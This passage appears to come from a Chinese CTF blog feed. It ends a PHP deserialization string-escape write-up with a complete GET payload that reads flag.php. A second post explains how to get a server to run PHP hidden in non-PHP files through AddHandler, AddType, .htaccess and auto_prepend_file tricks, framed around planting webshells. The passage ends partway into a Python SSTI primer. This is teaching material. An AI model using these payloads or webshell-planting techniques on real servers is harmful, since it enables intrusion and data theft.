ccc ) )</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2.PHP进行反序列化时，是以’;’ 作为字段的分隔，以 ‘}’作为结尾(字符串除外)，并且是根据长度判断内容的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> $b=<span class="string">'B'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">'this is a long  date'</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">';s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;'</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$a= <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//得到的结果是：</span></span><br><span class="line"><span class="comment">//O:1:"A":2:&#123;s:1:"a";s:20:"this is a long date";s:1:"b";s:38:";s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;";&#125;</span></span><br><span class="line">$b=unserialize($a)</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="comment">//输出的是A Object ( [a] =&gt; this is a long date [b] =&gt; ;s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125; )</span></span><br></pre></td></tr></table></figure><p>可以看出<code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:20:&quot;this is a long date&quot;;s:1:&quot;b&quot;;s:38:&quot;;s:1:&quot;b&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;s:1:&quot;B&quot;;}}&quot;;}</code>反序列化出来的是一个A对象有值为‘this is a long date’的字符串属性a，和值为‘;s:1:”b”;O:1:”B”:1:{s:1:”b”;s:1:”B”;}}’字符串属性b。但如果有什么特殊的原因让反例化的值产生了变化,如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果有什么特殊的原因让反例化的值产生了变化如"this is a long date"中的'is a long date‘去掉</span></span><br><span class="line">$b=<span class="string">'O:1:"A":2:&#123;s:1:"a";s:20:"this ";s:1:"b";s:38:";s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;";&#125;'</span></span><br><span class="line">print_r($b);</span><br><span class="line"><span class="comment">//输出是A Object ( [a] =&gt; this ";s:1:"b";s:38: [b] =&gt; B Object ( [b] =&gt; B ) )</span></span><br><span class="line">this <span class="string">";s:1:"</span><span class="string">b";s:38:"</span>;s:<span class="number">1</span>:</span><br></pre></td></tr></table></figure><p>可以看出输出结果为一个名为A的对象有两个属性一个是值为‘’this ‘;s:1:”b”;s:38:’的字符串属性a，另一个名为B的对象(里有名为b值为B的字符串属性)。可见在我们将<code>s:20:&quot;this is a long date&quot;;s:1:&quot;b&quot;;s:38:&quot;;</code>中的”this is a long date”改成“this ”后，在反序列化，仍以20的字符串长度来反序化，同时刚好20个字符后双引号和;号，于是将”this “;s:1:”b”;s:38:”;s:1:b”当成一个字符串。同时剩下的<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;s:1:&quot;B&quot;;}}</code>被当成一个对象来反序列化出来，而最后的 <code>&quot;;}</code>被忽视掉。这样就逃逸出来一个B Object。</p><h3 id="0x02例题分析"><a href="#0x02例题分析" class="headerlink" title="0x02例题分析"></a>0x02例题分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;fget.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $a;</span><br><span class="line">        $this-&gt;password &#x3D; $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b &#x3D; &#39;gqy&#39;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $c &#x3D; &#39;a&#39;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        &#x2F;&#x2F;flag.php</span><br><span class="line">        echo file_get_contents($this-&gt;c);</span><br><span class="line">        return &#39;nice&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">&#x2F;&#x2F;省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审计代码发现首先发现有三个类A、B、C。仔细分析，发现class A 有用于实例化传值的<code>__construct</code>方法。再分析类发现class C里有提示可以通过<code>__toString()</code>里file_get_contents函数读取flag。在class B，中有一个<code>__destruct()</code>里有个echo可以用来触发。发现unserialize与serialize函数发现是反序列化与序列化操作，但只能对class A进行操作。</p><p>分析完代码后，我们发现我们要想的效果是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$c = <span class="keyword">new</span> C();</span><br><span class="line">$c-&gt;c = <span class="string">"flag.php"</span>;</span><br><span class="line">$b-&gt;b = $c;</span><br><span class="line">$a-&gt;username = <span class="string">"1"</span>;</span><br><span class="line">$a-&gt;password = $b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>得到一个序列化的结果:</p><p><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></p><p>但一个正常的A的对象序列化的结果为：</p><p><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}</code></p><p>但我们可以通过php反序列化字符逃逸将<code>s:8:&quot;password&quot;;s:1:&quot;1&quot;;</code>替换为<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code>来达到我们想要的结果。</p><p>但再回到原码发现我们不是直接将序列化后的字符提交给unserialize函数。而是先将class A先实例出一个对象在将这个对象序列化，再经过write与read函数后，再提交给unserialize函数执行。我们分析write与read函数发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">    <span class="comment">//str_replace() 函数用法（要替换的字符，替换成的字符，要处理的字符串）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>比, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="comment">//'\0\0\0'比chr(0) . '*' . chr(0)多了3个字符长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们提交的数据中用‘\0\0\0’在执行read后就少了三字符。因此我们可以构造参数$a中有多个’\0\0\0’让他执行read后多出来的字符长度用来逃逸。让php编译器将<code>&quot;;s:8:&quot;password&quot;;s:60:&quot;2</code>是username的值。即<code>$a-&gt;username=“********&quot;;s:8:&quot;password&quot;;s:60:&quot;2&quot;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">48</span>:<span class="string">"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">74</span>:<span class="string">"2"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;O:<span class="number">1</span>:<span class="string">"B"</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">"b"</span>;O:<span class="number">1</span>:<span class="string">"C"</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">"c"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;&#125;&#125;<span class="string">";&#125;</span></span><br><span class="line"><span class="string">//得到--〉</span></span><br><span class="line"><span class="string">O:1:"</span>A<span class="string">":2:&#123;s:8:"</span>username<span class="string">";s:24:"</span>********<span class="string">";s:8:"</span>password<span class="string">";s:60:"</span><span class="number">2</span><span class="string">";O:1:"</span><span class="string">B":1:&#123;s:1:"</span><span class="string">b";O:1:"</span>C<span class="string">":1:&#123;s:1:"</span>c<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;&#125;"</span>;&#125;<span class="comment">//*号附近两边有看不见的chr(0)</span></span><br></pre></td></tr></table></figure><p>所以构造payload：</p><p><code>a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=2&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></p><h3 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h3><p><a href="https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</a></p><p><a href="https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/" target="_blank" rel="noopener">https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让文件里PHP代码被服务器解析执行</title>
      <link href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/"/>
      <url>/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>按照一般植入webshell的方法通常是上传一段包含恶意代码文件，然后让服务器解析文件里的恶意代码从而得到get shell的目的。那么问题来了,文件中什么的字符会被当成php代码来解析？PHP代码中指令怎么分割？什么样的文件服务器会去解析？(本文章默认要执行的文件已在网站目录下的情况)</p><a id="more"></a><h2 id="0x01PHP代码的特征"><a href="#0x01PHP代码的特征" class="headerlink" title="0x01PHP代码的特征"></a>0x01PHP代码的特征</h2><p>当然一个文件被php解析时不会全部都拿去执行，而是将具有php代码特征的部分拿去执行。而那特征就是php的开始与结束标记。</p><p>按照官方的说法：PHP解析器当解析一个文件时，PHP 会寻找起始和结束标记，这告诉 PHP 二者标记之间的是要解析的php代码。此种解析方式使得 PHP 可以被嵌入到各种不同的文档中去，而任何起始和结束标记之外的部分都会被 PHP 解析器忽略。</p><p>在官方文档中，给我们提供以下几种php起始和结束标记：</p><h3 id="1-’-lt-php’-与’-gt-‘"><a href="#1-’-lt-php’-与’-gt-‘" class="headerlink" title="(1)’&lt; ?php’ 与’? &gt;‘"></a>(1)’&lt; ?php’ 与’? &gt;‘</h3><p>这种标记用法是最常见的用法，也被称为长标签：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="comment">#起始标记,php可以大小写混用</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'this is php code'</span>;<span class="comment">#php代码部分</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">#结束标记</span></span><br></pre></td></tr></table></figure><h3 id="2-lt-script-gt-标签标记"><a href="#2-lt-script-gt-标签标记" class="headerlink" title="(2)&lt;script&gt;标签标记"></a>(2)&lt;script&gt;标签标记</h3><p>用script标签来标记php代码,使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;#php可以大小写混用</span><br><span class="line">        echo &#39;this is php code by script&#39;;#php代码部分</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>注意的是在php 7.0.0 版本后，，默认不支持这种写法。</p><h3 id="3-ASP-风格标记"><a href="#3-ASP-风格标记" class="headerlink" title="(3)ASP 风格标记"></a>(3)ASP 风格标记</h3><p>用&lt;%%&gt;来标记php,如要使用此种标记要php.ini 配置文件中的指令 asp_tags=On后才可用。 但要注意的是在7.0.0后的版本里移除了asp_tags.</p><p>具体使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;标记用法：</span><br><span class="line">&lt;%  echo &#39;this is php code by ASP&#39;; %&gt;</span><br><span class="line">&lt;% %&gt;格式的 echo 标记用法：</span><br><span class="line">&lt;%&#x3D;&#39;text&#39;; %&gt;#类似&lt;% echo &#39;echo&#39;;%&gt;</span><br></pre></td></tr></table></figure><h3 id="4-使用短标签来标记"><a href="#4-使用短标签来标记" class="headerlink" title="(4)使用短标签来标记"></a>(4)使用短标签来标记</h3><p>短标记（&lt;? ?&gt;）仅在通过 php.ini 配置文件中的指令 short_open_tag =On后才可用，或者在 PHP 编译时加入了 –enable-short-tags 选项.具体使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo&#39;this is php code by ASP&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>同时这种标签也有 echo 标记 ‘&lt;?=’:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&#39;text&#39;; ?&gt;#等价&lt;? echo &#39;echo&#39;;?&gt;的使用方式</span><br></pre></td></tr></table></figure><p>注意的是：PHP 5.4 起，短格式的 echo 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。</p><h2 id="0x02如何分割PHP代码指令"><a href="#0x02如何分割PHP代码指令" class="headerlink" title="0x02如何分割PHP代码指令"></a>0x02如何分割PHP代码指令</h2><p>同 C 或 Perl 一样，PHP 需要在每个语句后用分号结束指令。一段 PHP 代码中的结束标记隐含表示了一个分号；在一个 PHP 代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;单行代码可以省略;</span><br><span class="line">&lt;?php</span><br><span class="line">  echo &#39;this one commod&#39; </span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;多行代码，1句代码后要加;号,最后一行可以不用分号结束</span><br><span class="line">&lt;?php</span><br><span class="line">      echo &#39;this one commod&#39;;</span><br><span class="line">      echo &#39;this one commod&#39; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>除了用；号分割外，也可以用php标记来分隔：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $a&#x3D;&#39;this a code&#39;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?&#x3D;$a ?&gt;</span><br></pre></td></tr></table></figure><p>执行效果：</p><p><img src="image-20200515224849956.png" alt=""></p><h2 id="0x03让文件被服务器解析"><a href="#0x03让文件被服务器解析" class="headerlink" title="0x03让文件被服务器解析"></a>0x03让文件被服务器解析</h2><p>我们一般在初学php时，一般都是用phpstudy 或者Wampserver 来一件搭建php环境的。但在搭建后，就会发现一个问题。只有后缀名为php的文件里面的php代码被执行了,而其他后缀名的文件就算里面有php特征标记的php代码也没有被执行。</p><p><img src="image-20200517152606197.png" alt="image-20200517152606197"></p><p><img src="image-20200517152713360.png" alt="image-20200517152713360"></p><p>可见网站的服务器并未让非php文件里代码被执行。这是为什么？</p><p>这是因为网站的服务器在处理这个非php文件时，并未让它进入php解释器处理，而直接将数据传送过来。</p><p>那么问题来了如让服务器把文件送入php解释器？</p><h3 id="1-更改服务器的httpd-conf配置"><a href="#1-更改服务器的httpd-conf配置" class="headerlink" title="1.更改服务器的httpd.conf配置"></a>1.更改服务器的httpd.conf配置</h3><p>这里改法又有两种方法</p><h4 id="（1）使用AddHandler-指令："><a href="#（1）使用AddHandler-指令：" class="headerlink" title="（1）使用AddHandler 指令："></a>（1）使用AddHandler 指令：</h4><p>AddHandler 说明什么样的扩展名使用什么样的程序来处理，描述的是扩展名与处理程序之间的关系。具体用法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script  .extension</span><br><span class="line">#或者</span><br><span class="line">AddHandler application&#x2F;x-httpd-php  .extension</span><br><span class="line"></span><br><span class="line">extension代表任意文件的后缀名</span><br></pre></td></tr></table></figure><p><img src="image-20200517171022134.png" alt="image-20200517171022134"></p><p><img src="image-20200517170537530.png" alt="image-20200517170537530"></p><h4 id="（2）使用AddType指令："><a href="#（2）使用AddType指令：" class="headerlink" title="（2）使用AddType指令："></a>（2）使用AddType指令：</h4><p>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系.也可以用来描述后缀名与php解释器之间的关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType php5-script   .extension</span><br><span class="line">AddType application&#x2F;x-httpd-php  .extension</span><br></pre></td></tr></table></figure><p><img src="image-20200517172127721.png" alt="image-20200517172127721"></p><p><img src="image-20200517172408752.png" alt="image-20200517172408752"></p><h3 id="2-更改-htaccess文件"><a href="#2-更改-htaccess文件" class="headerlink" title="2.更改.htaccess文件"></a>2.更改.htaccess文件</h3><p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。如果要用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p><p>在/www/htdocs/example目录下的.htaccess文件中放置指令，与在主配置文件中&lt;Directory /www/htdocs/example&gt;段中放置相同指令，是完全等效的。</p><p>另外, .htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但要注意的是子目录中的 .htaccess中的指令会覆盖父目录的 .htaccess中的指令或者主配置文件中的指令。</p><p>我们可以在.htaccess文件中写入配置命令来达成我们的目的，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php  .extension</span><br></pre></td></tr></table></figure><p><img src="image-20200517224034769.png" alt="image-20200517224034769"></p><h3 id="3-更改php-fpm-conf"><a href="#3-更改php-fpm-conf" class="headerlink" title="3.更改php-fpm.conf"></a>3.更改php-fpm.conf</h3><p>php-fpm中文名称php FastCGI 进程管理器。PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。PHP-FPM提供了更好的PHP进程管理方式，可以有效控制内存和进程、可以平滑重载PHP配置。</p><p>php-fpm.conf文件里的security.limit_extensions 选项的参数作用是限制 FPM 允许解析的脚本扩展名。 此设置可以预防 web 服务器配置的错误。 应当限制 FPM 仅仅解析 .php 扩展名，阻止恶意用户使用其他扩展名运行 php 代码。 默认值： .php .phar</p><h3 id="4-利用文件包含来包含文件"><a href="#4-利用文件包含来包含文件" class="headerlink" title="4.利用文件包含来包含文件"></a>4.利用文件包含来包含文件</h3><h4 id="1-利用php函数包含代码执行"><a href="#1-利用php函数包含代码执行" class="headerlink" title="(1)利用php函数包含代码执行"></a>(1)利用php函数包含代码执行</h4><p>php在文件包含进行文件包含会执行php标记里代码。因此我们可以通过php的文件包含函数来通过一个执行的php页面来包含我们想要执行文件。</p><p>常见的文件包含的函数有：</p><p>1.include()  ：在包含文件没找到时会产生警告，并继续进行php代码。</p><p>2.include_once() ：在include() 的特性下，多了只能包含一次的特性。</p><p>3.require()：在包含文件没找到时会停止进行php代码。</p><p>4.require_once()：在require() 的特性下，多了只能包含一次的特性。</p><p>以上函数在执行时,会自动将要执行的脚本当成php来执行.</p><h4 id="2-利用-htaccess文件或php-ini文件来文件包含"><a href="#2-利用-htaccess文件或php-ini文件来文件包含" class="headerlink" title="(2)利用 .htaccess文件或php.ini文件来文件包含"></a>(2)利用 .htaccess文件或php.ini文件来文件包含</h4><p>同时也可以通过修改 .htaccess文件或php.ini文件,来进行文件.</p><p>php.ini中auto_prepend_file和auto_append_file分别可以在作用范围内的php文件在文件头/尾自动include指定文件并且可以支持php伪协议.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file 在页面顶部加载文件</span><br><span class="line">auto_append_file  在页面底部加载文件</span><br></pre></td></tr></table></figure><p>注意：auto_prepend_file 与 auto_append_file 只能包含一个php文件，但这个php文件内可以包含多个其他的php文件。</p><p>又 .htaccess文件中php_value 的设置可以设置php.ini里的选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file  shell.php</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64decode&#x2F;resource&#x3D;flag.php&quot;</span><br></pre></td></tr></table></figure><p>故可以把代码入.htaccess文件中，再通过auto_prepend_file/auto_append_file包含。即：</p><p><img src="image-20200612215358056.png" alt="image-20200612215358056"></p><h2 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h2><p><a href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">PHP 代码分离</a></p><p><a href="https://www.php.net/manual/zh/language.basic-syntax.instruction-separation.php" target="_blank" rel="noopener">php指令分割</a></p><p><a href="https://www.php.net/manual/zh/security.hiding.php" target="_blank" rel="noopener"> PHP 的文件后缀</a></p><p><a href="https://www.php.net/manual/zh/install.fpm.configuration.php" target="_blank" rel="noopener">FPM 的官方介绍</a></p><p><a href="https://baike.baidu.com/item/htaccess/1645473?fr=aladdin" target="_blank" rel="noopener">htaccess文件的介绍</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11741348.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于python ssti的思考</title>
      <link href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1关于ssti的讲解"><a href="#0x1关于ssti的讲解" class="headerlink" title="0x1关于ssti的讲解"></a>0x1关于ssti的讲解</h2><p>1.什么是ssti?</p><p>SSTI就是服务器端模板注入(Server-Side Template Injection).在一般的ctf中主要考查python比较多，故这篇文章主要是分析python下的ssti。</p><a id="more"></a><p>2.ssti出现的原因</p><p>ssti起因是在通过与服务端模板的输入输出交互时,服务器端把用户提交的数据处理,当成了代码来执行.从而让恶意用户通过构建了恶意代码,来读取了服务器上的信息或得到了服务器的shell.例如：在python的flask中，会把<code>{ {</code> <code>} }</code>号里面的参数当成代码来执行，如<code>{ {1+1} }</code>会被执行成为<code>{ {2} }</code>。</p><p>3.ssti漏洞的发现</p><p>对目标机构造payload来分析，如<code>{ {7+7} }</code>，<code>{ {&#39;7&#39;+&#39;7&#39;} }</code>等。看是否有ssti。再参考下图分析是何种模板的ssti</p><p><img src="image-20200327224713117.png" alt="image-20200327224713117"></p><p>​    </p><h2 id="0x2python基础"><a href="#0x2python基础" class="headerlink" title="0x2python基础"></a>0x2python基础</h2><h3 id="01-python魔术方法"><a href="#01-python魔术方法" class="headerlink" title="01.python魔术方法"></a>01.python魔术方法</h3><p>由于python的语法一贯奉行“一切皆是对象”的原则，所以python的一切变量都由类实例而来同时python有很多管理这些类与对象的内置魔术方法或函数。下面介绍几个常用的与类有关的魔术方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>） __class__</span><br><span class="line"><span 